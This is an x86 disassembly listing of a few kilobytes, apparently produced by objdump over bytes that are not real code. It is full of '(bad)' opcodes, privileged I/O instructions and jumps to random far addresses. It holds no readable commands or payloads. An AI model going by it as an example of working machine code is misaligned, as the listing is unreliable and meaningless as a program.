  4160ee:	lods   eax,DWORD PTR ds:[esi]
  4160ef:	cwde   
  4160f0:	dec    edx
  4160f1:	mov    bl,0x52
  4160f3:	mov    bh,0x6f
  4160f5:	push   ebx
  4160f6:	lahf   
  4160f7:	dec    esp
  4160f8:	dec    ebp
  4160f9:	in     al,0x24
  4160fb:	xchg   DWORD PTR ds:0x982fc5cc,esp
  416101:	mov    al,ds:0xbbe38e89
  416106:	mov    edi,esp
  416108:	mov    BYTE PTR [edi+0x6f],ah
  41610b:	aad    0x99
  41610d:	and    BYTE PTR [esi+0x642a857a],ch
  416113:	jno    0x416192
  416115:	dec    ebp
  416116:	cli    
  416117:	pushf  
  416118:	jmp    0x416197
  41611a:	xchg   esp,eax
  41611b:	iret   
  41611c:	inc    ebp
  41611d:	mov    ebp,0x60064f4c
  416122:	outs   dx,BYTE PTR ds:[esi]
  416123:	mov    edx,0xcaeeb4ad
  416128:	and    eax,DWORD PTR [edi+0x2d]
  41612b:	inc    edi
  41612c:	rol    DWORD PTR [ebx-0x1e],1
  41612f:	xlat   BYTE PTR ds:[ebx]
  416130:	inc    edx
  416131:	fisub  WORD PTR [edi+0x4fb76f23]
  416137:	jle    0x41618a
  416139:	push   0x676dfb92
  41613e:	out    0xf3,al
  416140:	sub    eax,0xfe545c37
  416145:	leave  
  416146:	inc    esi
  416147:	cmp    BYTE PTR [eax+0x5f],ah
  41614a:	test   eax,0x155a144e
  41614f:	(bad)  [eax]
  416151:	jbe    0x416189
  416153:	xor    eax,0x357bcee6
  416158:	loope  0x416133
  41615a:	fiadd  WORD PTR [ebp+0x788f086d]
  416160:	add    BYTE PTR [ebx],dl
  416162:	cmp    ebx,DWORD PTR [eax+0x53]
  416165:	push   ebp
  416166:	mov    ah,0x7b
  416168:	xor    eax,0xa2437ea3
  41616d:	or     al,0x7c
  41616f:	mov    esi,0xeb4371e7
  416174:	inc    edi
  416175:	mov    ebx,0xccce3f9e
  41617a:	xor    eax,0xc52a1283
  41617f:	(bad)  
  416180:	shr    BYTE PTR [eax-0x1e],1
  416183:	mov    BYTE PTR [esi-0x67],0x50
  416187:	dec    eax
  416188:	pop    es
  416189:	jo     0x41613b
  41618b:	jecxz  0x416202
  41618d:	retf   
  41618e:	pop    esi
  41618f:	icebp  
  416190:	dec    esp
  416191:	mov    ds:0x84e3748a,eax
  416196:	add    al,0xff
  416198:	iret   
  416199:	mov    eax,ds:0xf00315b1
  41619e:	fsubr  QWORD PTR [ecx-0x1473427]
  4161a4:	xor    al,0xe8
  4161a6:	mov    dh,0x3c
  4161a9:	sub    DWORD PTR es:[esi],edx
  4161ac:	inc    esi
  4161ad:	sbb    al,0x7b
  4161af:	cmp    esp,edx
  4161b1:	mov    DWORD PTR [esi],ecx
  4161b3:	or     bh,BYTE PTR [ebx-0xd5cca66]
  4161b9:	inc    edi
  4161ba:	outs   dx,BYTE PTR ds:[esi]
  4161bb:	pop    ebx
  4161bc:	mov    ecx,0x7cb79212
  4161c1:	mov    ah,BYTE PTR [eax+eax*1]
  4161c4:	neg    edi
  4161c6:	mov    ebx,0xd1de4e01
  4161cb:	cmc    
  4161cc:	sti    
  4161cd:	jb     0x41624e
  4161cf:	test   eax,0xbbb3c8fb
  4161d4:	clc    
  4161d5:	les    ebx,FWORD PTR [eax]
  4161d7:	shl    esp,0x26
  4161da:	push   0x56291ed
  4161df:	fdivp  st(0),st
  4161e1:	popa   
  4161e2:	ret    0xe5f8
  4161e5:	(bad)  
  4161e6:	in     al,0x69
  4161e8:	cmc    
  4161e9:	js     0x416199
  4161eb:	dec    ebx
  4161ec:	jle    0x4161d0
  4161ee:	push   ss
  4161ef:	xchg   edx,eax
  4161f0:	adc    ecx,ebx
  4161f2:	js     0x4161d0
  4161f4:	(bad)  
  4161f5:	cmp    ebx,DWORD PTR [esi+0x3157f006]
  4161fb:	jne    0x41624b
  4161fd:	xchg   esi,eax
  4161fe:	mov    cl,0x86
  416200:	bound  ebx,QWORD PTR [ebx+edi*4+0x32]
  416204:	mov    eax,0xb5c37800
  416209:	fs xchg bh,bh
  41620c:	(bad)  
  41620d:	mov    ebx,0xa53254fb
  416212:	cdq    
  416213:	and    eax,0x7940b6a4
  416218:	sahf   
  416219:	iret   
  41621a:	sub    edi,ecx
  41621c:	and    al,0x17
  41621e:	call   DWORD PTR [esi+0x1e]
  416221:	xchg   ebp,eax
  416222:	pop    eax
  416223:	pop    ebx
  416224:	mov    bl,0xfe
  416226:	inc    ecx
  416227:	ror    DWORD PTR [edx],0xe1
  41622a:	mov    ch,0x13
  41622c:	in     eax,0xf7
  41622e:	cmp    al,BYTE PTR [ebx+0xc]
  416231:	stos   BYTE PTR es:[edi],al
  416232:	inc    esi
  416233:	xchg   edi,eax
  416234:	hlt    
  416235:	rcl    DWORD PTR [edi-0x7b],cl
  416238:	rol    BYTE PTR [ebx+0x6c6da805],cl
  41623e:	repz and esp,esp
  416241:	lods   eax,DWORD PTR ds:[esi]
  416242:	inc    edi
  416243:	cmp    dh,cl
  416245:	frstpm(287 only) 
  416247:	lods   al,BYTE PTR ds:[esi]
  416248:	mov    bl,0x28
  41624a:	jmp    0x3ae9:0x5b32766e
  416251:	shr    BYTE PTR [edx+0x74],1
  416254:	imul   ecx,ecx,0xff0352cb
  41625a:	inc    edi
  41625b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41625c:	popf   
  41625d:	pop    ebx
  41625e:	repnz test DWORD PTR [edi-0x58c4b176],esp
  416265:	(bad)  
  416266:	rol    dh,1
  416268:	mov    eax,0xdadaec3c
  41626d:	inc    eax
  41626e:	sub    ah,BYTE PTR [ecx]
  416270:	imul   esi,DWORD PTR [ebx-0x5e1c5eae],0x40cc7a5d
  41627a:	test   BYTE PTR [ebp+0x3240c1b0],0xbf
  416281:	xor    al,0x59
  416283:	xchg   edx,eax
  416284:	ja     0x416272
  416286:	inc    ebx
  416287:	fdivrp st(3),st
  416289:	pop    es
  41628a:	jbe    0x416236
  41628c:	stos   BYTE PTR es:[edi],al
  41628d:	jae    0x416301
  41628f:	jb     0x416258
  416291:	jmp    FWORD PTR [ecx-0x2d]
  416294:	jmp    0xc7ee:0x5350fe38
  41629b:	mov    ?,WORD PTR [edi+ecx*4+0x794e005c]
  4162a2:	pop    ebx
  4162a3:	popa   
  4162a4:	jmp    0xb079443c
  4162a9:	push   ss
  4162aa:	loop   0x4162fd
  4162ac:	pop    es
  4162ad:	mov    esi,0x7833c652
  4162b2:	mov    ebp,0xd4fa8a03
  4162b7:	xchg   esp,eax
  4162b8:	jg     0x4162fd
  4162ba:	ds push ecx
  4162bc:	ror    BYTE PTR [ecx],0x56
  4162bf:	add    edi,DWORD PTR [eax]
  4162c1:	cmp    bh,BYTE PTR [edi]
  4162c3:	into   
  4162c4:	cwde   
  4162c5:	stos   BYTE PTR es:[edi],al
  4162c6:	pop    ds
  4162c7:	ins    BYTE PTR es:[edi],dx
  4162c8:	jne    0x4162d8
  4162ca:	aaa    
  4162cb:	mov    dl,0x7d
  4162cd:	cmp    edx,edx
  4162cf:	fwait
  4162d0:	jmp    0x416350
  4162d2:	or     eax,0xa7a462ca
  4162d7:	mov    eax,0x475a8470
  4162dc:	jp     0x4162c2
  4162de:	std    
  4162df:	push   ebp
  4162e0:	push   edi
  4162e1:	aad    0xae
  4162e3:	sub    dh,0x33
  4162e6:	mov    ds:0xa634723a,al
  4162eb:	ss icebp 
  4162ed:	cmp    dh,BYTE PTR [ebp+0x4202671a]
  4162f3:	push   ebp
  4162f4:	push   cs
  4162f5:	cmp    eax,0x8b937ec0
  4162fa:	call   0x2f0:0x66fed1da
  416301:	sbb    ebp,DWORD PTR [edx-0x14]
  416304:	xor    dl,ah
  416306:	imul   ecx,DWORD PTR [esi],0xf986bcca
  41630c:	clc    
  41630d:	pusha  
  41630e:	test   esi,ecx
  416310:	das    
  416311:	mov    eax,DWORD PTR [edi-0x4b366d60]
  416317:	mov    ch,0x75
  416319:	out    dx,al
  41631a:	cdq    
  41631b:	fdiv   QWORD PTR [ebp-0x215ff056]
  416321:	pop    ebx
  416322:	dec    esi
  416323:	push   0x32
  416325:	cld    
  416326:	cwde   
  416327:	aaa    
  416328:	int3   
  416329:	dec    edi
  41632a:	rcr    DWORD PTR [ebx-0x47423ec],0x43
  416331:	dec    ebp
  416332:	icebp  
  416333:	dec    eax
  416334:	inc    esp
  416335:	or     esi,DWORD PTR [ebx-0x26cff0f5]
  41633b:	dec    eax
  41633c:	lods   al,BYTE PTR ds:[esi]
  41633d:	inc    esp
  41633e:	sbb    bh,cl
  416340:	inc    edx
  416341:	aam    0x6c
  416343:	adc    esi,DWORD PTR [edi-0x1a5ad83b]
  416349:	(bad)  
  41634a:	add    DWORD PTR [edx+0x22],edx
  41634d:	xchg   edi,eax
  41634e:	fdivr  QWORD PTR ds:0x27fa3afa
  416354:	retf   0x16c1
  416357:	popf   
  416358:	fs stos DWORD PTR es:[edi],eax
  41635a:	mul    BYTE PTR [ecx+ebx*2]
  41635d:	inc    edi
  41635e:	lahf   
  41635f:	div    BYTE PTR [ecx-0x557be038]
  416365:	out    dx,eax
  416366:	mov    bh,0x8e
  416368:	arpl   WORD PTR [edi+0x36],sp
  41636b:	imul   ebx,DWORD PTR ds:0x1fa09e4a,0x6177c5f7
  416375:	ins    DWORD PTR es:[edi],dx
  416376:	fcomip st,st(1)
  416378:	out    dx,al
  416379:	mov    ds:0x69ce9222,al
  41637e:	leave  
  41637f:	mov    esi,ebx
  416381:	push   eax
  416382:	sti    
  416383:	xchg   ebp,eax
  416384:	and    al,0x52
  416386:	mov    ebx,0x2044d6d1
  41638b:	xor    al,0xe6
  41638d:	jb     0x41635b
  41638f:	xor    al,0x4b
  416391:	data16 daa 
  416393:	popa   
  416394:	jno    0x4163b9
  416396:	hlt    
  416397:	xor    DWORD PTR [esi],0x7d
  41639a:	inc    esp
  41639b:	jg     0x4163dd
  41639d:	test   BYTE PTR [eax-0x29823676],0x90
  4163a4:	pop    es
  4163a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163a6:	enter  0x4a0c,0x47
  4163aa:	fsqrt  
  4163ac:	sti    
  4163ad:	loop   0x416402
  4163af:	fnstenv [eax+0x19a1ff95]
  4163b5:	clc    
  4163b6:	rcl    DWORD PTR [edi-0x68],0x72
  4163ba:	sbb    al,BYTE PTR [eax+eiz*1+0x692f8421]
  4163c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163c2:	data16 fcomp DWORD PTR [ebx-0x11e20435]
  4163c9:	dec    eax
  4163ca:	jge    0x4163c1
  4163cc:	and    BYTE PTR [ebp-0x45106a05],bh
  4163d2:	mov    bh,0x90
  4163d4:	push   0xf658829
  4163d9:	adc    DWORD PTR ss:[edi+0x6f],edi
  4163dd:	xchg   BYTE PTR [edx+0x54],al
  4163e0:	in     eax,dx
  4163e1:	aam    0x2c
  4163e3:	adc    DWORD PTR [ebx-0x4c],esi
  4163e6:	sub    bl,bl
  4163e8:	jns    0x41639b
  4163ea:	mov    cl,0x3c
  4163ec:	xlat   BYTE PTR ds:[ebx]
  4163ed:	sbb    eax,0x249cdbc6
  4163f2:	dec    esi
  4163f3:	loope  0x4163fd
  4163f5:	enter  0x92d7,0xe8
  4163f9:	cs push esp
  4163fb:	leave  
  4163fc:	mov    bh,0x2f
  4163fe:	daa    
  4163ff:	sbb    DWORD PTR [ecx-0x18],ebp
  416402:	arpl   WORD PTR [edx+esi*1-0x5421b551],ax
  416409:	mov    eax,ds:0x7270f05c
  41640e:	add    bl,bl
  416410:	xor    esi,ecx
  416412:	fldenv [ecx-0x7d928de8]
  416418:	xor    dh,BYTE PTR [ecx]
  41641a:	fwait
  41641b:	cmp    DWORD PTR [edi],eax
  41641d:	or     DWORD PTR [esi-0x57],esi
  416420:	cmp    esi,DWORD PTR [ebx+0x72b6ebf7]
  416426:	xchg   edx,eax
  416427:	pop    ss
  416428:	mov    edi,0x303640ed
  41642d:	push   cs
  41642e:	inc    eax
  41642f:	xchg   edx,eax
  416430:	adc    ah,dh
  416432:	pushf  
  416433:	mov    eax,0x5620163
  416438:	xchg   edx,eax
  416439:	xchg   BYTE PTR [esi-0x4033aa00],ch
  41643f:	into   
  416440:	add    ch,BYTE PTR [esi+0x5181301e]
  416446:	jp     0x4163f1
  416448:	add    edi,DWORD PTR [esi]
  41644a:	sti    
  41644b:	sar    edx,1
  41644d:	out    0x5b,al
  41644f:	test   BYTE PTR [esi+0x1a],dl
  416452:	dec    edi
  416453:	adc    BYTE PTR [ecx+0x3b],bl
  416456:	fwait
  416457:	pop    ecx
  416458:	not    DWORD PTR [ebp+0x40f8829]
  41645e:	ret    
  41645f:	mov    esi,DWORD PTR [eax-0x73]
  416462:	inc    ebp
  416463:	(bad)  
  416464:	dec    edx
  416465:	dec    edi
  416466:	je     0x416416
  416468:	repnz adc bl,0xee
  41646c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41646d:	xchg   edx,eax
  41646e:	push   eax
  41646f:	fdiv   DWORD PTR [edx]
  416471:	xchg   esp,eax
  416472:	cmc    
  416473:	out    dx,al
  416474:	jnp    0x41646b
  416476:	test   BYTE PTR [ebp+0x6cb5bc74],cl
  41647c:	push   edi
  41647d:	add    eax,0x817aa685
  416482:	push   esi
  416483:	pop    es
  416484:	sub    ch,BYTE PTR [esi-0x80]
  416487:	stos   BYTE PTR es:[edi],al
  416488:	push   esp
  416489:	mov    ds:0x3f6ab610,al
  41648e:	mov    dl,0x9b
  416490:	in     eax,dx
  416491:	popf   
  416492:	mov    ecx,0x6fc28678
  416497:	and    al,0x7f
  416499:	iret   
	...
  416512:	add    BYTE PTR [eax],al
  416514:	adc    eax,0xfe3de0ab
  416519:	jg     0x4164f8
  41651b:	stos   DWORD PTR es:[edi],eax
  41651c:	mov    esi,DWORD PTR [edi+0x1d86d01b]
  416522:	sbb    eax,0x109a902
  416527:	add    BYTE PTR [esi+0x7],ch
  41652a:	add    BYTE PTR [eax],al
  41652c:	clc    
  41652d:	(bad)  
  41652e:	lods   eax,DWORD PTR ds:[esi]
  41652f:	jbe    0x4164c6
  416531:	cmp    al,0x83
  416533:	jge    0x416540
  416535:	push   ecx
  416536:	scas   al,BYTE PTR es:[edi]
  416537:	clc    
  416538:	jmp    0x41654c
  41653a:	fwait
  41653b:	sub    eax,0xaadf1f95
  416540:	cwde   
  416541:	inc    eax
  416542:	xchg   ebx,eax
  416543:	(bad)  
  416545:	clc    
  416546:	sbb    ebp,0xc88d045f
  41654c:	dec    ecx
  41654d:	imul   edx,DWORD PTR [esi+0x36],0x780e479c
  416554:	fnstenv [esi]
  416556:	dec    edi
  416557:	cmp    al,0xc9
  416559:	mov    dl,BYTE PTR [esi]
  41655b:	jne    0x41657a
  41655d:	push   esi
  41655e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41655f:	push   ebp
  416560:	mov    esi,0xca77380f
  416565:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416566:	hlt    
  416567:	jne    0x4165b9
  416569:	cmp    DWORD PTR [edx],esp
  41656b:	xchg   DWORD PTR [esi-0x2f],ecx
  41656e:	sub    BYTE PTR [edx],ch
  416570:	scas   eax,DWORD PTR es:[edi]
  416571:	cmp    DWORD PTR [ecx-0x45],0x5a0d1565
  416578:	fucom  st(3)
  41657a:	addr16 sub al,0xf3
  41657d:	cmp    eax,0x5a23988a
  416582:	jl     0x416521
  416584:	lods   eax,DWORD PTR ds:[esi]
  416585:	mov    ebx,0xc10df203
  41658a:	mov    DWORD PTR [edx-0x24],ebp
  41658d:	aaa    
  41658e:	dec    esp
  41658f:	loop   0x41659c
  416591:	pop    edi
  416592:	and    al,0xaa
  416594:	adc    BYTE PTR [esi+0x52],dl
  416597:	lods   al,BYTE PTR ds:[esi]
  416598:	or     al,0x3a
  41659a:	dec    esi
  41659b:	sub    DWORD PTR [ecx],ebx
  41659d:	je     0x4165c9
  41659f:	(bad)  
  4165a0:	pop    edx
  4165a1:	mov    eax,0x1cda631c
  4165a6:	test   esi,esi
  4165a8:	lods   eax,DWORD PTR ds:[esi]
  4165a9:	inc    ebp
  4165aa:	lock and al,BYTE PTR [ebp+esi*4+0x4b]
  4165af:	mov    ah,0x60
  4165b1:	mov    esi,0x7d07fa97
  4165b6:	pop    ecx
  4165b7:	mov    esp,0x76c87d1c
  4165bc:	das    
  4165bd:	(bad)  
  4165be:	jo     0x41661f
  4165c0:	jmp    0x41fd:0x3b844a11
  4165c7:	and    BYTE PTR [esi+0x501f8ee7],dh
  4165cd:	std    
  4165ce:	pop    esi
  4165cf:	ja     0x416593
  4165d1:	push   esp
  4165d2:	mov    cl,0x6a
  4165d4:	sub    edx,eax
  4165d6:	in     al,0xf5
  4165d8:	leave  
  4165d9:	call   0xe6f0:0x93cd6816
  4165e0:	xor    esi,DWORD PTR [edi]
  4165e2:	mov    ds:0xec4a449a,eax
  4165e7:	out    dx,al
  4165e8:	and    al,0x10
  4165ea:	dec    eax
  4165eb:	jmp    0xfa3:0x813391b9
  4165f2:	cdq    
  4165f3:	mov    ch,0xf1
  4165f5:	data16 je 0x416585
  4165f8:	cmp    esp,DWORD PTR [ecx+esi*4-0x3081a2d8]
  4165ff:	(bad)  
  416600:	add    BYTE PTR [eax-0x24],al
  416603:	cmp    DWORD PTR [eax-0x4e07f770],edx
  416609:	sti    
  41660a:	shl    DWORD PTR ds:0x62cce7b4,1
  416610:	xor    al,0x26
  416612:	jle    0x4165f8
  416614:	push   ds
  416615:	lds    edi,FWORD PTR [ebp+ecx*2-0x39]
  416619:	fbstp  TBYTE PTR [eax+0xa]
  41661c:	pop    ecx
  41661d:	sahf   
  41661e:	inc    edx
  41661f:	xchg   ecx,eax
  416620:	jg     0x4165d1
  416622:	aaa    
  416623:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416624:	jb     0x416686
  416626:	xor    ecx,DWORD PTR [esi]
  416628:	mov    al,0x86
  41662a:	leave  
  41662b:	and    al,BYTE PTR [esp+ebp*1+0x6c69a9a9]
  416632:	call   0xf1b7:0x5d210273
  416639:	xchg   ebx,eax
  41663a:	push   ecx
  41663b:	test   BYTE PTR [esp+ecx*1-0x14],bl
  41663f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416640:	stos   DWORD PTR es:[edi],eax
  416641:	xor    ecx,DWORD PTR [ebp+0x3477df7c]
  416647:	retf   
  416648:	(bad)  
  416649:	out    0xe9,eax
  41664b:	imul   esi,DWORD PTR [edx+0x7c],0x3a9b53a7
  416652:	fst    DWORD PTR [edi+0x1b]
  416655:	rol    DWORD PTR [ecx],cl
  416657:	add    al,0x94
  416659:	ss sbb al,0xb9
  41665c:	enter  0x2762,0x45
  416660:	pop    es
  416661:	pop    ecx
  416662:	popf   
  416663:	int    0xa2
  416665:	aaa    
  416666:	and    BYTE PTR [edi],0x1f
  416669:	fidiv  DWORD PTR [esi+edx*2+0x68cb0416]
  416670:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416671:	xchg   ebx,eax
  416672:	sbb    BYTE PTR [ebx+esi*8+0x4c431333],ch
  416679:	addr16 (bad) 
  41667b:	sbb    al,0x5d
  41667d:	loop   0x416635
  41667f:	sub    esi,0x20
  416682:	jnp    0x4166cb
  416684:	xor    eax,0x5c4944b0
  416689:	div    BYTE PTR [esi-0x5cae6e4d]
  41668f:	stos   DWORD PTR es:[edi],eax
  416690:	loop   0x4166f6
  416692:	or     ah,BYTE PTR [eax]
  416694:	xchg   esp,eax
  416695:	xor    BYTE PTR [edx],0xd1
  416698:	test   eax,0x589d9b4a
  41669d:	sub    bh,BYTE PTR [eax-0x78]
  4166a0:	inc    edi
  4166a1:	and    al,0x42
  4166a3:	sti    
  4166a4:	xor    eax,eax
  4166a6:	lods   eax,DWORD PTR ds:[esi]
  4166a7:	cmp    edx,ebx
  4166a9:	and    BYTE PTR [ebx],0x47
  4166ac:	shr    esp,0x56
  4166af:	int3   
  4166b0:	xor    cl,dh
  4166b2:	sbb    esp,DWORD PTR [ebx+edi*4+0x19b41e6b]
  4166b9:	push   ds
  4166ba:	aam    0xfb
  4166bc:	and    DWORD PTR [eax+0x64ba0e7a],ebp
  4166c2:	fild   DWORD PTR [edx-0x26]
  4166c5:	mov    dl,0xcf
  4166c7:	cmp    cl,cl
  4166c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166ca:	push   edi
  4166cb:	std    
  4166cc:	lods   eax,DWORD PTR ds:[esi]
  4166cd:	mov    ds:0x52e62b8a,al
  4166d2:	cmp    dh,dh
  4166d4:	mov    edx,0x870f2f3f
  4166d9:	mov    al,0xad
  4166db:	mov    WORD PTR ds:0x925f559d,?
  4166e1:	cmp    eax,0x5f36b4aa
  4166e6:	sub    eax,0x626b029
  4166eb:	enter  0xdaee,0x40
  4166ef:	or     DWORD PTR [esi-0x34],eax
  4166f2:	pop    es
  4166f3:	repnz leave 
  4166f5:	xor    esi,DWORD PTR [esi]
  4166f7:	mov    bl,0xa4
  4166f9:	jbe    0x416743
  4166fb:	retf   0x7513
  4166fe:	sbb    al,0x6b
  416700:	(bad)  
  416701:	test   al,0xea
  416703:	jge    0x41674a
  416705:	shl    DWORD PTR [ecx],1
  416707:	adc    eax,0xae4eac39
  41670c:	pop    es
  41670d:	ds imul esi,edx,0xffffffe1
  416711:	out    dx,al
  416712:	enter  0x2671,0xc4
  416716:	add    BYTE PTR ds:0xbdd6cd10,al
  41671c:	mov    ecx,0x2659e1c9
  416721:	adc    al,BYTE PTR [ebp-0x49]
  416724:	push   es
  416725:	sbb    al,0x1f
  416727:	and    DWORD PTR [esi],edi
  416729:	pushf  
  41672a:	aad    0x75
  41672c:	mov    ah,0xbb
  41672e:	aas    
  41672f:	fsubrp st(2),st
  416731:	push   0xb1cde467
  416736:	dec    edi
  416737:	push   cs
  416738:	add    BYTE PTR [eax-0x5ba426c7],0x74
  41673f:	bound  eax,QWORD PTR [edx-0x38895d86]
  416745:	and    eax,ebp
  416747:	sti    
  416748:	je     0x416752
  41674a:	rcl    DWORD PTR [ebx+0x21d43c51],cl
  416750:	in     al,dx
  416751:	sub    eax,0x2c25ce95
  416756:	sub    BYTE PTR [eax-0x24906a3b],0x61
  41675d:	push   edi
  41675e:	out    0x4c,al
  416760:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416761:	shr    esp,cl
  416763:	mov    eax,0x24bfbaf0
  416768:	pop    ecx
  416769:	aaa    
  41676a:	test   eax,0x65382383
  41676f:	test   DWORD PTR [ebx],ecx
  416771:	push   eax
  416772:	xor    eax,DWORD PTR [esi+0x18818e8d]
  416778:	dec    eax
  416779:	(bad)  
  41677a:	lock add al,0x51
  41677d:	fucom  st(1)
  41677f:	mov    eax,ds:0x5dc269d2
  416784:	fsub   QWORD PTR ds:0x8103226b
  41678a:	mov    ecx,0xb46720ef
  41678f:	xor    eax,0x87e18123
  416794:	push   esi
  416795:	fnstsw WORD PTR [ecx+0x54750c87]
  41679b:	(bad)  
  41679c:	call   0x3060:0x6e2d98c
  4167a3:	mov    dl,0xe
  4167a5:	mov    ebx,0x2c882e01
  4167aa:	mov    edi,0x21e1305d
  4167af:	lods   al,BYTE PTR ds:[esi]
  4167b0:	cmp    esi,DWORD PTR [eax*4-0xae243a3]
  4167b7:	call   DWORD PTR [edx-0x32cff6c0]
  4167bd:	loop   0x4167ec
  4167bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167c0:	cmc    
  4167c1:	sub    eax,0x144ce221
  4167c6:	mov    esp,0x8666148f
  4167cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167cc:	push   es
  4167cd:	imul   esi,ebp,0xffffff88
  4167d0:	xchg   esp,eax
  4167d1:	push   ebp
  4167d2:	push   0x21
  4167d4:	scas   al,BYTE PTR es:[edi]
  4167d5:	jnp    0x4167b1
  4167d7:	xor    eax,0x99700087
  4167dc:	xor    BYTE PTR [esi],cl
  4167de:	mov    ah,0xdf
  4167e0:	cwde   
  4167e1:	xor    dl,cl
  4167e3:	mov    esi,0xf8852743
  4167e8:	or     DWORD PTR [ebp+0x31dd18f8],ebx
  4167ee:	mov    edi,0x5f10a33a
  4167f3:	int3   
  4167f4:	rcl    ch,cl
  4167f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167f7:	inc    ebp
  4167f8:	scas   al,BYTE PTR es:[edi]
  4167f9:	push   0xffffffc3
  4167fb:	mov    dh,0xc6
  4167fd:	ret    0x953a
  416800:	or     al,0x17
  416802:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416803:	mov    ds:0xfec24bbd,eax
  416808:	out    dx,al
  416809:	push   es
  41680a:	pusha  
  41680b:	jecxz  0x416860
  41680d:	not    dl
  41680f:	xor    BYTE PTR [ebp+0x2d71264c],bl
  416815:	mov    bh,0xbc
  416817:	push   esp
  416818:	pop    ecx
  416819:	enter  0x6193,0xe
  41681d:	xor    DWORD PTR [edi+0x1c10a1db],esi
  416823:	adc    dh,BYTE PTR [edx]
  416825:	cwde   
  416826:	jl     0x416807
  416828:	nop
  416829:	jns    0x416848
  41682b:	(bad)  
  41682c:	lock repz hlt 
  41682f:	pusha  
  416830:	jnp    0x4167da
  416832:	and    al,0x43
  416834:	outs   dx,DWORD PTR ds:[esi]
  416835:	sub    edx,DWORD PTR [edi+eiz*2+0x4e]
  416839:	mov    ds:0xc503730,al
  41683e:	aam    0xe
  416840:	out    dx,eax
  416841:	int3   
  416842:	push   esi
  416843:	ret    
  416844:	sbb    ch,dl
  416846:	ja     0x416886
  416848:	pop    eax
  416849:	imul   edi,DWORD PTR [ebx],0xffffffb3
  41684c:	adc    bl,BYTE PTR [ebx-0x4b]
  41684f:	push   ecx
  416850:	sbb    BYTE PTR [esi],ch
  416852:	xchg   ecx,eax
  416853:	sub    bl,BYTE PTR [ebp-0x62]
  416856:	lock and ebp,DWORD PTR [eax-0x63]
  41685a:	push   0xcf68d2b4
  41685f:	cmp    eax,0xefbf14f4
  416864:	jle    0x416853
  416866:	sub    al,BYTE PTR [ebp-0x71]
  416869:	push   0xfffffff0
  41686b:	jb     0x4168cb
  41686d:	sar    ecx,0x2d
  416870:	and    BYTE PTR [ebp-0x62],bl
  416873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416874:	sub    al,0x55
  416876:	push   esi
  416877:	lds    ecx,FWORD PTR [edi+0x32]
  41687a:	sbb    al,0x2f
  41687c:	sbb    bl,BYTE PTR [eax+eiz*4]
  41687f:	(bad)  
  416882:	test   BYTE PTR [edi+0x39a458e1],ch
  416888:	inc    esi
  416889:	mov    ah,0x58
  41688b:	mov    edi,0xf5b015de
  416890:	fst    DWORD PTR [esi]
  416892:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416893:	fistp  DWORD PTR [eax-0x2ba6be27]
  416899:	in     al,0x7f
  41689b:	or     eax,0xa7974f7c
  4168a0:	mov    ds:0xffc730ae,al
  4168a5:	cmp    eax,0xf1dc84fc
  4168aa:	enter  0xe08f,0xc6
  4168ae:	and    edi,DWORD PTR [ecx-0x69021621]
  4168b4:	mov    edi,DWORD PTR [ebx-0x7]
  4168b7:	or     edx,ecx
  4168b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168ba:	jp     0x4168bb
  4168bc:	push   esp
  4168bd:	test   al,0xcd
  4168bf:	inc    esi
  4168c0:	pushf  
  4168c1:	lds    ebx,FWORD PTR [eax-0x3af5022e]
  4168c7:	nop
  4168c8:	out    0x5b,eax
  4168ca:	sbb    BYTE PTR [esi-0x253ab371],dl
  4168d0:	push   cs
  4168d1:	outs   dx,DWORD PTR gs:[esi]
  4168d3:	mov    dh,0x49
  4168d5:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4168d7:	es push esp
  4168d9:	sub    ebp,0x6536cf6d
  4168df:	loop   0x416954
  4168e1:	js     0x41694c
  4168e3:	or     al,0xb8
  4168e5:	sub    al,0x5b
  4168e7:	or     al,0x4a
  4168e9:	or     ah,ch
  4168eb:	sub    BYTE PTR [esi+0x55eee962],cl
  4168f1:	mov    ebp,DWORD PTR [esp+ebp*2+0x79c813b2]
  4168f8:	mov    cl,0x82
  4168fa:	dec    eax
  4168fb:	sbb    BYTE PTR [edi+0x42],ch
  4168fe:	ret    
  4168ff:	push   ebx
  416900:	sub    ah,BYTE PTR [ecx]
  416902:	inc    ebp
  416903:	push   ecx
  416904:	inc    ebp
  416905:	repz cli 
  416907:	push   edx
  416908:	push   eax
  416909:	mov    esi,DWORD PTR [edi+0x35]
  41690c:	outs   dx,DWORD PTR ds:[si]
  41690e:	add    bl,al
  416910:	ror    DWORD PTR [eax+0x59],cl
  416913:	retf   
  416914:	clc    
  416915:	sub    edi,0xce869712
  41691b:	lahf   
  41691c:	fwait
  41691d:	cmp    al,0x58
  41691f:	mov    edi,0x4c086801
  416924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416925:	test   dh,cl
  416927:	imul   cl
  416929:	ins    BYTE PTR es:[edi],dx
  41692a:	dec    eax
  41692b:	push   edi
  41692c:	mov    dl,0xc
  41692e:	jno    0x416913
  416930:	popa   
  416931:	les    ecx,FWORD PTR [esi-0x5c2f19d5]
  416937:	mov    ebp,0x28c45d4b
  41693c:	dec    cx
  41693e:	stos   BYTE PTR es:[edi],al
  41693f:	xor    ebp,DWORD PTR [edi]
  416941:	rol    DWORD PTR [ebp+0x18],1
  416944:	add    BYTE PTR [ebx],0x32
  416947:	outs   dx,DWORD PTR ds:[esi]
  416948:	cs (bad) 
  41694a:	adc    bh,BYTE PTR ds:0xc8f7d13c
